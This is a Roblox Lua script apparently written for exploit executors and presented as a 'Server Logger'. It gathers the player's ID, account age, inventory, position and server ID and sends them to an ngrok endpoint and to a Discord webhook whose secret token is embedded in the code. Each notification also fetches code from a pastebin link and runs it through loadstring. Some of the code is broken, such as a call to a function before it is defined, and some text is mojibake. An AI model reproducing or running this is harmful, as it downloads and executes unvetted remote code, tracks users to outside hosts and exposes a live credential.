local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

-- ======= CONFIGURATION =======
local API_BASE_URL = "https://0844-2001-448a-106e-4be8-56bb-76c9-5288-28b1.ngrok-free.app/api"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF"
local LOGGING_INTERVAL = 10 -- seconds
-- ==============================

local player = Players.LocalPlayer
local currentJobId = game.JobId
local playerName = player.Name
local playerUserId = player.UserId
local lastPosition = nil

-- Enhanced HTTP request with better error handling
local function httpRequest(url, method, body, headers, retries)
    retries = retries or 3
    local requestFunc = syn and syn.request or http_request or request or (http and http.request)
    if not requestFunc then 
        warn("[HTTP] No compatible request function found")
        return nil 
    end
    
    headers = headers or {}
    headers["Content-Type"] = headers["Content-Type"] or "application/json"
    headers["ngrok-skip-browser-warning"] = "true"

    for i = 1, retries do
        local success, response = pcall(function()
            local result = requestFunc({
                Url = url,
                Method = method,
                Headers = headers,
                Body = body
            })
            
            -- Debug logging
            print(string.format("[HTTP] %s %s (Attempt %d/%d) - Status: %d",
                method, url, i, retries, result.StatusCode or 0))
                
            return result
        end)
        
        if success and response then
            if response.StatusCode == 429 then -- Rate limited
                local retryAfter = tonumber(response.Headers["Retry-After"]) or 5
                warn(string.format("[HTTP] Rate limited. Retrying after %d seconds", retryAfter))
                wait(retryAfter)
            else
                return response
            end
        else
            warn(string.format("[HTTP] Attempt %d failed: %s", i, response or "Unknown error"))
        end
        
        wait(1 + (i * 2)) -- Exponential backoff
    end
    return nil
end

-- Improved backpack scanning with item details
local function getInventoryContents()
    local contents = {}
    local function scanContainer(container)
        for _, item in ipairs(container:GetChildren()) do
            local itemInfo = {
                Name = item.Name,
                Class = item.ClassName,
                AssetId = item:GetAttribute("AssetId") or item:FindFirstChild("AssetId") and item.AssetId.Value or nil
            }
            table.insert(contents, itemInfo)
        end
    end
    
    -- Check both backpack and character
    if player:FindFirstChild("Backpack") then
        scanContainer(player.Backpack)
    end
    
    local character = player.Character
    if character then
        for _, container in ipairs({"Tool", "Weapon", "Accessory"}) do
            if character:FindFirstChild(container) then
                scanContainer(character[container])
            end
        end
    end
    
    return contents
end

-- Formatted inventory string for Discord
local function formatInventoryString()
    local items = getInventoryContents()
    if #items == 0 then return "Inventory empty" end
    
    local grouped = {}
    for _, item in ipairs(items) do
        local key = item.Name
        if item.AssetId then
            key = key .. " (ID: "..item.AssetId..")"
        end
        grouped[key] = (grouped[key] or 0) + 1
    end
    
    local parts = {}
    for name, count in pairs(grouped) do
        table.insert(parts, string.format("%s Ã—%d", name, count))
    end
    
    return table.concat(parts, "\n")
end

-- External script execution with version checking
local function executeExternalScript()
    local versionCheck = httpRequest(EXTERNAL_SCRIPT..".version", "GET")
    local currentVersion = 1.0 -- Default version
    
    if versionCheck and versionCheck.Success then
        currentVersion = tonumber(versionCheck.Body) or currentVersion
    end
    
    local scriptResponse = httpRequest(EXTERNAL_SCRIPT, "GET")
    if not scriptResponse or not scriptResponse.Success then
        return false, "Failed to fetch script"
    end
    
    local success, err = pcall(function()
        local fn, err = loadstring(scriptResponse.Body)
        if not fn then error(err) end
        fn()
    end)
    
    return success, success and "v"..currentVersion or err
end

-- Enhanced position tracking with movement detection
local function sendUserPosition()
    local character = player.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then
        warn("[Position] Character not available")
        return false
    end
    
    local rootPart = character.HumanoidRootPart
    local currentPos = rootPart.Position
    
    -- Only send if position changed significantly (> 1 stud)
    if lastPosition and (currentPos - lastPosition).Magnitude < 1 then
        return true
    end
    
    lastPosition = currentPos
    
    local posData = {
        instanceId = currentJobId,
        userId = tostring(playerUserId),
        position = { 
            x = math.floor(currentPos.X * 100)/100,
            y = math.floor(currentPos.Y * 100)/100,
            z = math.floor(currentPos.Z * 100)/100 
        },
        velocity = {
            x = math.floor(rootPart.Velocity.X * 100)/100,
            y = math.floor(rootPart.Velocity.Y * 100)/100,
            z = math.floor(rootPart.Velocity.Z * 100)/100
        }
    }
    
    local response = httpRequest(
        API_BASE_URL .. "/setUserPosition",
        "POST",
        HttpService:JSONEncode(posData)
    )
    
    if response and (response.StatusCode == 200) then
        print(string.format("[Position] Updated: X=%.1f, Y=%.1f, Z=%.1f", 
            posData.position.x, posData.position.y, posData.position.z))
        return true
    else
        warn("[Position] Update failed")
        return false
    end
end

-- Server change detection with teleport verification
local function monitorServerChanges()
    local lastJobId = currentJobId
    local lastTeleport = 0
    local teleportCooldown = 30
    
    while true do
        local now = os.time()
        local newJobId = game.JobId
        
        if newJobId ~= lastJobId then
            -- Prevent false positives from teleport glitches
            if now - lastTeleport < teleportCooldown then
                print("[Server] Ignoring server change (recent teleport)")
            else
                print(string.format("[Server] Change detected: %s â†’ %s", lastJobId, newJobId))
                currentJobId = newJobId
                lastJobId = newJobId
                handleServerJoin()
            end
        end
        
        task.wait(1)
    end
end

-- Enhanced Discord webhook with rich embed
local function sendDiscordNotification(eventType, extraData)
    local embed = {
        username = "Server Logger",
        avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="..playerUserId.."&width=420&height=420&format=png",
        embeds = {{
            title = eventType == "error" and "âŒ Script Error" or "ðŸ”„ Server Change",
            description = eventType == "error" 
                and string.format("**%s** encountered an error", playerName)
                or string.format("**%s** changed servers\n**New Instance:** `%s`", playerName, currentJobId),
            color = eventType == "error" and 16711680 or 16776960,
            timestamp = DateTime.now():ToIsoDate(),
            fields = {
                {
                    name = "ðŸ‘¤ Player Info",
                    value = string.format("UserID: %d\nDisplay: %s\nAge: %d days", 
                        playerUserId, player.DisplayName, player.AccountAge),
                    inline = true
                },
                {
                    name = "ðŸ“¦ Inventory",
                    value = formatInventoryString(),
                    inline = true
                },
                {
                    name = "ðŸŽ® Game Info",
                    value = string.format("PlaceID: %d\nJobID: %s", game.PlaceId, currentJobId),
                    inline = true
                }
            },
            footer = {
                text = "Server Logger v4.1",
                icon_url = "https://i.imgur.com/fKL31aD.png"
            }
        }}
    }
    
    -- Add error details if applicable
    if eventType == "error" and extraData then
        table.insert(embed.embeds[1].fields, {
            name = "Error Details",
            value = "```"..tostring(extraData):sub(1, 1000).."```",
            inline = false
        })
    end
    
    -- Add script status
    local scriptStatus, scriptVersion = executeExternalScript()
    table.insert(embed.embeds[1].fields, {
        name = "ðŸ“œ External Script",
        value = scriptStatus and ("âœ… Loaded "..scriptVersion) or "âŒ Failed to load",
        inline = false
    })
    
    -- Add position data if available
    if lastPosition then
        table.insert(embed.embeds[1].fields, {
            name = "ðŸ“ Last Position",
            value = string.format("X: %.1f\nY: %.1f\nZ: %.1f", 
                lastPosition.X, lastPosition.Y, lastPosition.Z),
            inline = true
        })
    end
    
    local response = httpRequest(
        WEBHOOK_URL,
        "POST",
        HttpService:JSONEncode(embed),
        {["Content-Type"] = "application/json"}
    )
    
    return response and response.StatusCode == 204
end

-- Main server join handler
local function handleServerJoin()
    print("[System] Handling server join...")
    
    -- Update instance data
    local instanceData = {
        instanceId = currentJobId,
        userId = tostring(playerUserId),
        timestamp = os.time()
    }
    
    local updateSuccess = false
    for i = 1, 3 do
        local response = httpRequest(
            API_BASE_URL .. "/setInstanceUser",
            "POST",
            HttpService:JSONEncode(instanceData)
        )
        
        if response and response.StatusCode == 200 then
            updateSuccess = true
            break
        end
        task.wait(2)
    end
    
    -- Send notification
    local notifySuccess = sendDiscordNotification("server_change")
    
    -- Start position tracking
    coroutine.wrap(function()
        while true do
            sendUserPosition()
            task.wait(LOGGING_INTERVAL)
        end
    end)()
    
    return updateSuccess and notifySuccess
end

-- Main execution
local function initialize()
    print(string.format("[System] Initializing for %s (UserID: %d)", playerName, playerUserId))
    
    -- Initial server join handling
    local success, err = pcall(handleServerJoin)
    if not success then
        warn("[System] Initialization failed:", err)
        sendDiscordNotification("error", err)
        return
    end
    
    -- Start server change monitoring
    coroutine.wrap(monitorServerChanges)()
    
    print("[System] Initialization complete")
end

-- Error protected startup
local success, err = pcall(initialize)
if not success then
    warn("[System] Critical startup error:", err)
    sendDiscordNotification("error", err)
end
